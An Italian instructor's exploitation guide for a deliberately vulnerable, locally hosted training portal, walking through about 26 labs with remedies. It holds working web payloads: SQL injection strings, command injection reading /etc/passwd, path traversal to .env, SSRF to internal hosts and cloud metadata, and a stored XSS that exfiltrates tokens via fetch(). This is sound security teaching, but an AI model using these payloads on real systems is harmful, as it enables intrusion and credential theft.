# Guida allo sfruttamento — materiale per il docente

> **Da non consegnare agli studenti.** Contiene i passaggi operativi di ogni finding.
> Se il repository viene distribuito alla classe, escludi questa cartella (`docs/docente/`) o
> consegna il portale senza di essa.
>
> Tutto gira su `127.0.0.1`. Nulla di quanto segue è applicabile a sistemi reali: l'ente, i
> dati e i servizi non esistono. Non incollare questi input in nessun sistema che non sia
> questo laboratorio.

## Stato del documento

**Bozza di M0.** Le tecniche sono standard e corrette; i **nomi dei parametri, le rotte e le
risposte** sono quelli progettati in `DESIGN.md` e vanno confermati lab per lab quando il
codice esiste (M2–M6). Ogni scheda ha un marcatore:

| Marcatore | Significato |
|---|---|
| `[progetto]` | tecnica definita, stringhe da verificare sul codice |
| `[verificato]` | provato sul portale in esecuzione |

Tutte le schede sono oggi `[progetto]`. La tabella finale tiene il conto.

## Come si legge

Per ogni finding: **prerequisiti** (che account/ruolo serve), **passi**, **input**, **cosa
osservare** (il segnale che dice che il lab è vivo), **se non funziona** (le cause tipiche),
**rimedio da spiegare** (una riga, perché la correzione si spiega a voce).

---

# Capitolo 1 — Ricognizione

## L19 — Esposizione e configurazione `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://<host>:8081/robots.txt` → elenca `/admin`, `/backup/`, `/debug`, `/sportello/`.
   Non è un controllo di accesso: è un elenco di cose da provare.
2. `GET http://<host>:8081/.git/HEAD` → `ref: refs/heads/main`.
3. Ricostruisci l'albero. Con `git-dumper http://<host>:8081/.git/ ./sorgente`, oppure con
   `python3 docs/docente/strumenti/dump-git.py http://<host>:8081/.git`. Dentro c'è il commit
   del 2 aprile 2025: *«Collaudo di carico: disattiva temporaneamente il rate limit»*.
4. `GET /backup/` → elenco della cartella; `GET /backup/dump-2019.sql` → schema vecchio e hash
   MD5 delle password.
5. `GET /debug` → le ultime query dell'API con i valori interpolati, compresi i codici fiscali
   di chi ha fatto accesso nei minuti precedenti.
6. `GET /debug?sql=SELECT%20*%20FROM%20tabella_inesistente` → pagina di debug del framework con
   stack trace, percorso dei file e variabili d'ambiente. (`/api/pratiche/abc` **non** serve:
   risponde `404` in JSON perché la rotta è vincolata ai numeri.)
7. Preflight con `Origin: http://esempio.invalid` → `Access-Control-Allow-Origin: *`.
8. Apri `http://<host>:8081/debug` dentro un `<iframe>` da un'altra origine → si incastra: non
   c'è `X-Frame-Options`, quindi quella pagina si può coprire con una pagina dell'attaccante.

**Cosa osservare:** il `.git` non è un file finto, è un repository vero: chi lo ricostruisce ha
il sorgente di oggi *e* la storia. Il dump del 2019 ha uno schema diverso da quello attuale
(`password` a 32 caratteri, nessuna tabella `sessioni`): serve a distinguerlo dal database in
esercizio.

**Se non funziona:** verifica che Apache serva i file nascosti. In nginx il blocco è
`location ~ /\.` e qui **non c'è**: è l'errore che stiamo dimostrando. Se `/.git/HEAD` risponde
`404` con `File not found`, l'entrypoint non ha copiato i reperti in `public/`.

**Rimedio da spiegare:** i file di lavoro non stanno nella document root; `robots.txt` non è un
controllo di accesso; una console di debug non si spedisce in produzione nemmeno «per un giorno».
## L21 — Dipendenze obsolete `[verificato]`

**Prerequisiti:** nessuno.

**Passi:** `GET http://<host>:8081/admin/dipendenze` → tabella con pacchetto, versione, stato e
nota.

**Cosa osservare:** cinque voci su dieci sono obsolete, con il CVE e una riga di descrizione.
Nessuna di quelle librerie è realmente installata: la pagina è documentativa. Il contrasto da
mostrare è con `composer.lock`, che L19 ha già consegnato: lì ci sono le versioni vere, e non
coincidono con quelle dichiarate.

**Rimedio da spiegare:** un inventario delle dipendenze che nessuno rigenera è già vecchio il
giorno dopo averlo pubblicato.

**Stato:** provata la pagina il 20 novembre 2026. La pagina non è protetta e non richiede
account.
## L24 — Logging insufficiente `[verificato]`

**Prerequisiti:** nessuno — il registro è pubblico.

**Passi**

1. `GET http://<host>:8081/admin/log` senza alcun token → si leggono gli accessi di tutti.
2. Sbaglia la password dieci volte, poi ricarica il registro: **non cambia niente**. La
   condizione che scarta le risposte `401` è la prima riga del middleware.
3. Inietta una riga: invia una richiesta con
   `User-Agent: Mozilla/5.0 <script>document.write("iniettato")</script>` e ricarica il
   registro. Il testo compare nel database e viene rimandato al browser senza escape.
4. Confronta l'ora di una riga con l'orologio: il registro scrive in UTC senza dirlo, quindi
   d'inverno la riga è un'ora indietro rispetto a Roma, d'estate due.

**Cosa osservare:** il registro sembra completo e non lo è: mancano proprio gli eventi che
direbbero che qualcuno sta provando migliaia di codici fiscali. E chi può scriverci sopra è
chiunque, compreso il browser di chi indaga.

**Rimedio da spiegare:** registrare gli eventi di autenticazione, correlare le richieste,
scrivere in UTC dichiarandolo, separare chi può leggere il registro. Una riga di log non
ripulita non è un problema di log: è una XSS che arriva da un canale che nessuno controlla.
## L22 — Enumerazione, rate limit, sessioni `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. **Enumerazione.** `POST /api/login` con un CF inesistente → `{"errore":"Codice fiscale non
   registrato."}`; con un CF esistente e password sbagliata → `{"errore":"Password errata."}`.
2. **Nessun limite.** Ripeti dieci volte: nessuna attesa, nessun `429`. La storia del `.git`
   (L19) spiega perché il limitatore è stato spento.
3. **Sessione fissa.** Apri lo sportello con `curl -b 'PHPSESSID=attaccante123'` e fai accedere
   la vittima: il cookie restituito è **lo stesso** che l'attaccante aveva scelto. Con quel
   valore si leggono le pratiche della vittima.
4. **Uscita che non chiude.** `GET /sportello/esci` mostra «sessione chiusa»; con lo stesso
   cookie le pratiche rispondono ancora.

**Cosa osservare:** tre difetti distinti — messaggio, contatore, ciclo di vita della sessione —
e un quarto che li unisce: l'interfaccia dichiara cose che il server non ha fatto.

**Trappole:** l'enumerazione richiede **due** richieste (esiste / non esiste), altrimenti non si
vede. La sessione fissa richiede due jar di cookie. Il token dell'API non c'entra: qui si parla
del cookie dello sportello.

**Rimedio da spiegare:** messaggio unico, contatore per utente e per IP con blocco progressivo,
`session_regenerate_id()` dopo l'accesso, logout che distrugge sessione e cookie.

**Stato:** provati tutti e quattro i comportamenti il 20 novembre 2026.
## L10 — Iniezione SQL sul login `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST http://<host>:8081/api/login` con
   `{"codice_fiscale":"' OR 1=1#","password":"x"}`.
2. La risposta è `200` con un token. Decodificando il payload: `sub: 1`, `ruolo: cittadino`.
3. È Mario Rossi, la prima riga: l'iniezione non sceglie chi essere, restituisce la prima riga
   utile (invariante I1). Per scegliere serve il capitolo 5.

**Cosa osservare:** nessuna sanificazione da aggirare, nessuna concatenazione «quasi giusta»:
la query è stringa, e la password entra come MD5 (L08), quindi il confronto vive nella clausola.

**Trappola:** `--` richiede uno spazio dopo in MySQL; `#` no. Chi parte con `--` perde tempo.

**Rimedio da spiegare:** prepared statement; e la migrazione a bcrypt, che toglie all'attacco la
forza bruta.

**Stato:** provato il 20 novembre 2026.
## L08 — Hash deboli e password riutilizzate `[verificato]`

**Prerequisiti:** nessuno; il dump del 2019 è in L19.

**Passi**

1. `GET http://<host>:8081/debug?sql=SELECT%20codice_fiscale,password%20FROM%20utenti%20WHERE%20id=1`
   → `RSSMRA85M01F205T` con `5f4dcc3b5aa765d61d8327deb882cf99`.
2. Quell'hash è `password`: la ricerca su qualunque dizionario di hash lo dice in un secondo.
3. Prova il login con Mario Rossi e quella password: entra.
4. Confronta con il dump `backup/dump-2019.sql`: schema vecchio, stessa debolezza.

**Cosa osservare:** l'hash non ha sale, quindi due persone con la stessa password hanno lo
stesso valore, e un dizionario precalcolato le apre tutte insieme.

**Trappola:** `Hash::check()` su un MD5 restituisce `false` senza errore: chi riusa il codice di
Laravel crede di aver verificato qualcosa.

**Rimedio da spiegare:** `bcrypt`/`argon2` con costo adeguato, migrazione al primo accesso,
niente hash nei dump.

**Stato:** provato il 20 novembre 2026.
## L09 — Segreti e token `[verificato]`

**Prerequisiti:** nessuno per il primo passo, un account per gli altri.

**Passi**

1. Apri `http://<host>:8080/app.js` e cerca `CHIAVE_BANCA`: è la chiave del servizio bancario,
   non quella che firma i token.
2. DevTools → Application → Local Storage: `token`.
3. Decodifica il payload → `iss`, `sub`, `jti`, `ruolo`, `iat`. **Non c'è `exp`.**
4. `POST /api/logout` con il token → `200`; poi `GET /api/me` con lo stesso token → `200`. Il
   logout non revoca nulla.

**Cosa osservare:** la tabella `sessioni` si riempie a ogni accesso e nessuno la legge. Un
token rubato vale finché non cambia il segreto di firma.

**Trappola:** il portale tratta il `401` come «sessione scaduta», quindi riusare un token
vecchissimo mostra un messaggio fuorviante. Non è il difetto: lo nasconde.

**Rimedio da spiegare:** chiavi fuori dal codice client (la verifica IBAN la fa l'API, non il
browser); token a vita breve con refresh; revoca server-side; `httpOnly` se si torna ai cookie.

**Stato:** provato il 20 novembre 2026.
## L17 — Recupero credenziali prevedibile e OTP debole `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST /api/recupera-password` con il CF di Giulia.
2. Apri Mailpit su `http://<host>:8025`: l'email contiene il collegamento
   `http://<host>:8080/#/reimposta?cf=...&token=<CF><AAAAMMGG>`.
3. Il token è il codice fiscale più la data: costruisci quello di **Sara Bianchi**
   (`BNCSRA79C54L219X`) per oggi e chiama `POST /api/reimposta-password`. Non serve che Sara
   abbia mai chiesto il recupero: `reimposta` ricalcola il token invece di leggerlo.
4. Accedi con la password nuova: il token restituito ha `ruolo: funzionario`.
5. Sull'account amministrativo (`MRCLDA65S02H501L`) il recupero risponde `403` e la reimpostazione
   `401`: è l'invariante I5, va mostrata esplicitamente.
6. Per l'OTP: `POST /api/rimborsi/{id}/iban` con un codice sbagliato risponde `401` senza ritardi
   né blocchi; tre tentativi di fila passano senza conseguenze, poi quello giusto risponde `200`.
   Lo spazio è di 10.000 valori e non c'è contatore.

**Cosa osservare:** due difetti diversi nello stesso flusso. Il primo è la prevedibilità del
token (difetto di progetto); il secondo è l'assenza di un contatore sui tentativi (difetto di
esercizio). Il secondo si corregge in un pomeriggio, il primo richiede di ripensare il flusso.

**Trappole:** la password nuova deve avere almeno sei caratteri, altrimenti `422` e sembra un
rifiuto dell'attacco. L'OTP **non** arriva per email: si ricava dall'identificativo
(`id * 7 % 10000`), che è un terzo difetto e un'ottima domanda da fare in aula.

**Rimedio da spiegare:** token casuale da almeno 128 bit, monouso, a scadenza breve, legato
all'utente e conservato (non ricalcolato); OTP a sei cifre con lockout e durata.

**Stato:** provato il 20 novembre 2026, fino all'accesso come funzionario.
## L01 — IDOR in lettura `[progetto]`

**Prerequisiti:** account di Giulia (o Mario).

**Passi**

1. `GET /api/cartelle/{id}` con il proprio id → la cartella da € 1.247,00.
2. Cambia l'id (`-1`, `+1`, …) → cartelle di altri contribuenti.
3. `GET /api/pratiche/{id}` e `GET /api/rimborsi/{id}` → pratiche e rimborsi altrui, PDF incluso.

**Cosa osservare:** la risposta non è "404 per caso": il controllo di appartenenza non esiste
proprio. Con 200 contribuenti si arriva all'intero archivio un id alla volta.

**Se non funziona:** se torna 403, qualcuno ha aggiunto una policy — verifica che l'invariante
non sia stata "corretta" per errore.

**Rimedio da spiegare:** autorizzazione sulla **risorsa**, non sull'utente; id non indovinabili
aiutano ma non sostituiscono il controllo.

## L02 — IDOR in scrittura `[progetto]`

**Prerequisiti:** account di Giulia.

**Passi**

1. `PATCH /api/cartelle/{id}` con `{"importo": 0, "stato": "annullata"}` sul **proprio** id →
   l'obiettivo dichiarato del corso è raggiunto.
2. Ripeti sull'id di Mario: funziona uguale.

**Cosa osservare:** leggere è un incidente, scrivere è un reato. Il codice accetta anche
`codice_fiscale`? No: **non deve** (vedi L05), altrimenti questo endpoint diventa un secondo
modo di impersonare e il capitolo 4 perde il suo premio.

**Rimedio da spiegare:** stessa regola del L01, più la regola "il corpo della richiesta non
decide chi sono io".

## L03 — Forced browsing `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `GET /api/admin/export` con il token di Giulia → CSV con tutti i contribuenti.
2. Confronta con `GET /api/admin/utenti`, che invece risponde 403: il middleware c'è, ma non
   su tutti gli endpoint.

**Cosa osservare:** è il difetto che spiega l'articolo del giornalista: un endpoint protetto e
uno no, nella stessa cartella di codice.

**Rimedio da spiegare:** autorizzazione dichiarativa sul gruppo di rotte, non endpoint per
endpoint.

## L04 — Path traversal `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `GET /api/pratiche/{id}/allegato?file=documento.pdf` → il PDF.
2. `?file=../../.env` → variabili d'ambiente, comprese le credenziali del database.
3. Calcola i `../` corretti: la cartella base è `storage/app/allegati`; per arrivare a `.env`
   in radice servono tre livelli.

**Cosa osservare:** la risposta restituisce il file anche se il nome non ha estensione
ammessa.

**Rimedio da spiegare:** risolvi il percorso e verifica che resti dentro la cartella base
(`realpath` + prefisso); meglio ancora, servi gli allegati per id, non per nome.

## L05 — Mass assignment `[progetto]`

**Prerequisiti:** account di Giulia (prima parte); account funzionario (seconda parte).

**Passi — prima parte: impersonare un cittadino**

1. `PATCH /api/profilo` con `{"codice_fiscale": "RSSMRA85M01H501Z"}`.
2. `GET /api/me` → ora sei Mario, e vedi le sue pratiche senza cambiare id.

**Passi — seconda parte: promuoversi (capitolo 6)**

1. Con il token di Sara: `PATCH /sportello/utenti/{id_di_sara}` con `{"ruolo": "amministratore"}`.
2. Ricarica: il menu amministrativo compare.

**Cosa osservare:** lo stesso `$fillable` serve due controller; quello del cittadino filtra i
campi, quello dello sportello no. È l'escalation finale, e richiede di essere già funzionario.

**Rimedio da spiegare:** `$fillable` minimale, e DTO espliciti per i campi che l'utente può
davvero cambiare.

## L06 — CSRF sul cambio IBAN `[progetto]`

**Prerequisiti:** account funzionario, con la sessione cookie del modulo legacy attiva.

**Passi**

1. Su `esca` c'è la pagina `csrf.html`: un form che fa `POST` a
   `/sportello/rimborso/{id}/iban` con `iban=IT00X0000000000000000000000`.
2. Con la sessione aperta, apri quella pagina e premi il pulsante.
3. Il rimborso ora punta altrove, senza che l'utente abbia fatto nulla di strano.

**Cosa osservare:** funziona **solo** sul modulo legacy, perché usa il cookie. Sulla SPA, con
il Bearer, lo stesso attacco non funziona. È la lezione sul perché il modello di credenziale
cambia il modello di minaccia.

**Rimedio da spiegare:** token anti-CSRF per sessione, `SameSite=Lax` o `Strict`, verifica
dell'`Origin`.

## L07 — Reindirizzamento aperto `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://<host>:8081/sportello/?ritorno=http://esca.example/phishing`.
2. Accedi con Giulia (`NREGLI90A41H501G` / `ciao123`).
3. La risposta è `302` con `Location: http://esca.example/phishing`.

**Cosa osservare:** il dominio nella barra è quello dell'agenzia fino al clic. Il parametro
attraversa il form come campo nascosto, quindi l'attacco si manda per email e regge il sospetto
di chi controlla l'indirizzo.

**Trappola:** `//esempio.example` funziona uguale e i filtri scritti a mano lo sbagliano spesso.

**Rimedio da spiegare:** accettare solo percorsi relativi che iniziano con `/` e non con `//`,
oppure una lista chiusa di destinazioni.

**Stato:** provato il 20 novembre 2026 sullo sportello locale.
## L23 — Deserializzazione insicura `[progetto]`

**Prerequisiti:** account di Giulia.

**Passi**

1. `POST /api/profilo/preferenze` con `{"preferenze": "<base64>"}`.
2. Manda un oggetto qualsiasi: l'errore rivela che il contenuto è passato a `unserialize()`.
3. Con la classe che il codice istanzia (quella che genera il report), costruisci l'oggetto che
   nel distruttore scrive un file in una cartella scelta.

**Cosa osservare:** non è "input non validato": è un **formato** che permette di costruire
oggetti. Il pericolo sta nei metodi magici, non nei dati.

**Rimedio da spiegare:** `json_decode` invece di `unserialize`; se serve serializzare, firma il
payload e usa una whitelist di classi.

## L26 — Upload non sicuro `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. Carica `prova.png` (accettato).
2. Carica `prova.html` rinominandolo con `Content-Type: image/png`: viene accettato.
3. `GET /storage/allegati/prova.html` → il browser lo interpreta come pagina, non come immagine.

**Cosa osservare:** il controllo guarda quello che il client **dichiara**, non quello che il
file contiene.

**Rimedio da spiegare:** whitelist di estensioni e MIME reali, rinomina, `Content-Disposition:
attachment`, servizio da un dominio separato.

---

# Capitolo 4 — XSS e furto del token

> Il capitolo si gioca in due finestre: una normale (attaccante) e una **in incognito** (Sara).
> Chiudi quella in incognito solo alla fine.

## L14 — XSS riflesso `[progetto]`

**Prerequisiti:** nessuno (il modulo contatti è pubblico).

**Passi**

1. Apri "Scrivi all'ufficio".
2. Invia `<img src=x onerror=alert(document.domain)>`.

**Cosa osservare:** lo script gira nel contesto del portale, non in quello dell'utente. Con
`document.cookie` si legge il cookie di sessione del modulo legacy: manca `HttpOnly`.

**Se non funziona:** se il testo appare "sporco", qualcuno ha cambiato `{!! !!}` in `{{ }}`.

**Rimedio da spiegare:** escape in uscita, non in entrata; CSP come seconda linea.

## L15 — XSS stored e furto del token `[progetto]`

**Prerequisiti:** due finestre; la vittima è la finestra in incognito con l'account di Sara.

**Passi**

1. Nella finestra normale sei Giulia: apri la **tua** pratica e aggiungi una nota con il payload.
   La nota è un'"integrazione alla pratica", funzione che il cittadino ha davvero.
2. Sara, quando lavora la tua pratica, apre la stessa pagina nel modulo sportello e la nota
   viene resa come HTML.
3. Payload:

```html
<img src=x onerror="fetch('http://127.0.0.1:8026/c?t='+encodeURIComponent(localStorage.getItem('token'))+'&cf='+encodeURIComponent(localStorage.getItem('cf')))">
```

4. Nella finestra in incognito, entra come Sara e apri la pratica: l'immagine parte, il token
   arriva su `esca`.
5. Apri `http://127.0.0.1:8026` e copia il token.
6. Nella finestra normale: DevTools → Application → Local Storage, sostituisci `token`, ricarica.

**Cosa osservare:** Sara non ha cliccato niente di strano: ha aperto una pratica. La differenza
tra XSS riflesso e stored è che la vittima non deve fare nulla.

**Se non funziona:** controlla che `esca` sia raggiungibile dal browser (`127.0.0.1:8026`) e che
il payload non venga salvato escapato (`{!! !!}`).

**Rimedio da spiegare:** sanitizzazione con whitelist (HTML purifier), CSP, e soprattutto:
perché un token rubabile vale l'intero account.

## L16 — XSS DOM `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET /accedi?torna=<img src=x onerror=alert(1)>`.
2. Lo script gira senza che nulla passi dal server: guarda il codice della SPA, la riga con
   `innerHTML`.

**Cosa osservare:** nei log del server la richiesta non contiene nulla di sospetto — l'ha
eseguita il client. È il finding che dimostra perché i filtri lato server non bastano.

**Rimedio da spiegare:** `textContent` invece di `innerHTML`; sanitizzazione lato client.

---

# Capitolo 5 — Iniezione

## L11 — UNION e information disclosure `[progetto]`

**Prerequisiti:** account **funzionario** (la ricerca pratiche è nello sportello).

**Passi**

1. Individua il numero di colonne: `?cf=' ORDER BY 6-- -` (nessun errore) e `ORDER BY 7-- -`
   (errore).
2. `?cf=' UNION SELECT 1,2,3,4,5,6-- -` → quali numeri compaiono in pagina? Quelli sono le
   colonne renderizzate.
3. Sostituisci con `codice_fiscale, nome, cognome, email, password, ruolo FROM utenti` →
   dump degli hash.
4. `?sort=id,` → errore SQL in pagina con la query completa.

**Cosa osservare:** il passo 4 è la tecnica più realistica: l'iniezione su un **identificatore**
(`ORDER BY`) non è parametrizzabile nemmeno con i prepared statement, e qui l'errore racconta
lo schema.

**Rimedio da spiegare:** valori → parametri; identificatori → whitelist esplicita; errori
dettagliati solo in sviluppo.

## L12 — Blind e time-based `[progetto]`

**Prerequisiti:** nessuno (l'endpoint di verifica è pubblico).

**Passi**

1. `?protocollo=2025/0001234` → "Pratica in lavorazione".
2. `?protocollo=9999' AND '1'='1` → ancora "in lavorazione" (vero).
3. `?protocollo=9999' AND '1'='2` → "Protocollo non trovato" (falso).
4. `?protocollo=9999' OR SLEEP(3)-- -` → la risposta arriva dopo tre secondi.

**Cosa osservare:** il passo 3 è la macchina binaria: una condizione vera/falsa. Il passo 4 non
richiede che la risposta cambi, solo che arrivi tardi — e regge anche quando il messaggio è
sempre identico.

**Se non funziona:** con `AND SLEEP()` su una riga che non esiste il ritardo non si vede:
serve `OR SLEEP()`.

**Rimedio da spiegare:** query parametriche; il tempo di risposta è un canale come un altro.

## L13 — Command injection `[progetto]`

**Prerequisiti:** funzionario.

**Passi**

1. Genera il PDF di una pratica: `POST /sportello/report` con `{"pratica": 118}`.
2. Prova `{"pratica": "118;id"}` → l'output del comando compare nel messaggio di errore.
3. `"118;cat /etc/passwd"` per convincersene.

**Cosa osservare:** il convertitore è invocato con `exec()` e gli argomenti sono concatenati.
È il classico difetto di un'integrazione scritta in fretta.

**Rimedio da spiegare:** niente shell; API della libreria; se serve la shell, array di argomenti
e valori validati.

---

# Capitolo 6 — Soldi e perimetro

## L18 — Race condition sul rimborso `[progetto]`

**Prerequisiti:** account cittadino con un rimborso in stato richiedibile.

**Passi**

1. Una richiesta normale → `202`, stato `richiesto`.
2. Due richieste **simultanee** → due rimborsi.

```bash
# solo dal docente, sul proprio laboratorio
for i in 1 2; do
  curl -s -X POST "http://127.0.0.1:8081/api/rimborsi/12/richiedi" \
       -H "Authorization: Bearer $TOKEN" &
done; wait
```

**Cosa osservare:** la finestra è il tempo tra il controllo "già richiesto?" e la scrittura.
Se il seeder ha finestre di pochi millisecondi, allarga il delay solo per la demo e rimettilo
a posto dopo.

**Rimedio da spiegare:** transazione con lock o vincolo di unicità sul database — il controllo
applicativo non basta mai.

## L06/L05 — Escalation (vedi capitolo 3)

## L25 — SSRF `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `POST /api/allegati/da-url` con `{"url": "http://banca:8080/health"}` → risponde.
2. `{"url": "http://anagrafe:8080/cittadini"}` → l'archivio vero.
3. `{"url": "http://admin:admin@anagrafe:8080/cittadini"}` → credenziali predefinite passate
   nell'URL, onorate dal client HTTP.
4. `{"url": "file:///var/www/html/.env"}` → variabili d'ambiente del portale.
5. `{"url": "http://169.254.169.254/latest/meta-data/"}` → il classico bersaglio cloud (qui non
   risponde: serve a spiegare dove si andrebbe in un ambiente reale).

**Cosa osservare:** i servizi interni non hanno `ports:` e dal browser non esistono. Il punto
del capitolo: *"non era esposto su Internet, era esposto a voi."*

**Se non funziona:** se il client HTTP non onora le credenziali nell'URL, aggiungi un header
`Authorization` all'endpoint — e annotalo come variante verificata.

**Rimedio da spiegare:** whitelist di destinazioni, risoluzione DNS e blocco degli IP privati,
niente `file://`, rete segmentata.

## L20 — Credenziali predefinite sull'anagrafe `[progetto]`

**Prerequisiti:** L25.

**Passi:** con l'URL autenticato del L25 si ottiene il dump completo; `admin/admin` compare
anche nella pagina di login del pannello, raggiungibile via SSRF.

**Cosa osservare:** il servizio interno è protetto dall'esterno, non dagli attacchi.

**Rimedio da spiegare:** nessuna credenziale predefinita; l'accesso interno si autentica come
quello esterno.

---

# La catena completa, in trenta minuti

Utile per la dimostrazione introduttiva del corso:

1. `robots.txt` → `/.git` → leggo il `// TODO` sul rate limit. *(L19)*
2. `' OR 1=1#` sul login → sono Mario, che non sono io. *(L10)*
3. Cambio l'id → la cartella di Giulia. *(L01)*
4. `PATCH` sull'id mio → il mio debito sparisce. *(L02)*
5. Nota con payload sulla pratica di Sara → apro l'incognito, Sara apre la pratica, il token
   arriva su `esca`. *(L15)*
6. Con il token di Sara: `PATCH /sportello/utenti/{id}` con `ruolo: amministratore`. *(L05)*
7. `GET /api/admin/export` e infine la SSRF verso l'anagrafe. *(L03, L25)*

---

# Prima di ogni lezione

| Controllo | Comando / azione |
|---|---|
| Stack su | `docker compose ps` → sette servizi `running` |
| Stato pulito | `docker compose exec api php artisan lab:reset` |
| Portale | `http://127.0.0.1:8080` risponde |
| API | `http://127.0.0.1:8081/api/health` risponde |
| Posta | `http://127.0.0.1:8025` mostra la casella |
| Esplosivo | `http://127.0.0.1:8026` è vuoto (nessun token residuo) |
| Invariante I1 | `' OR 1=1#` → **Mario Rossi**, non amministratore |
| Invariante I3 | la password del funzionario non è nel dizionario |
| Invariante I5 | il reset sull'admin è rifiutato |

Se uno di questi controlli non torna, il laboratorio è rotto e va ripristinato **prima** di far
entrare la classe: un lab che non funziona in aula costa più di uno che non c'è.

---

# Tabella di stato

| Lab | Tecnica | Stato |
|---|---|---|
| L01 | IDOR lettura | `[progetto]` |
| L02 | IDOR scrittura | `[progetto]` |
| L03 | Forced browsing | `[progetto]` |
| L04 | Path traversal | `[progetto]` |
| L05 | Mass assignment (×2) | `[progetto]` |
| L06 | CSRF | `[progetto]` |
| L07 | Open redirect | `[verificato]` |
| L08 | MD5 | `[verificato]` |
| L09 | Segreti e token | `[verificato]` |
| L10 | SQLi login | `[verificato]` |
| L11 | UNION + error-based | `[progetto]` |
| L12 | Blind + time-based | `[progetto]` |
| L13 | Command injection | `[progetto]` |
| L14 | XSS riflesso | `[progetto]` |
| L15 | XSS stored + furto token | `[progetto]` |
| L16 | XSS DOM | `[progetto]` |
| L17 | Reset prevedibile + OTP | `[verificato]` |
| L18 | Race condition | `[progetto]` |
| L19 | Configurazione ed esposizione | `[progetto]` |
| L20 | Credenziali predefinite | `[progetto]` |
| L21 | Dipendenze obsolete | `[verificato]` |
| L22 | Autenticazione e sessioni | `[verificato]` |
| L23 | Deserializzazione | `[progetto]` |
| L24 | Logging | `[progetto]` |
| L25 | SSRF | `[progetto]` |
| L26 | Upload | `[progetto]` |

Il marcatore diventa `[verificato]` quando la scheda è stata provata sul portale in esecuzione,
insieme al codice del lab (M2–M6).
